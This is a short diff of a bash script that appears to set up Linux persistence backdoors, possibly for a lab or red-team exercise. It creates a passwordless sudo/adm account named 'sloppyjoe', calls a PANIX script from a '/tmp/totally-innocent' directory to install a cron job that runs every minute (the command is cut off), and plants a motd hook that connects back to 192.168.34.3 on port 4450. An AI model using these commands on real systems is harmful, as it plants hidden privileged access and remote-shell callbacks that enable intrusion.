@@ -1,8 +1,9 @@
 #!/bin/bash
 
 
+
 # Create Admin User sloppyjoe
-adduser --gecos "" "sloppyjoe"
+adduser --disabled-password --gecos "" "sloppyjoe"
 usermod -aG sudo,adm "sloppyjoe"
  
 # Service creation
@@ -23,4 +24,7 @@ bash /tmp/totally-innocent/panix.sh --cron --custom --command "* * * * * /bin/ba
 
 #motd
 sudo ./panix.sh --motd --default --ip 192.168.34.3 --port 4450
+
+
+
  
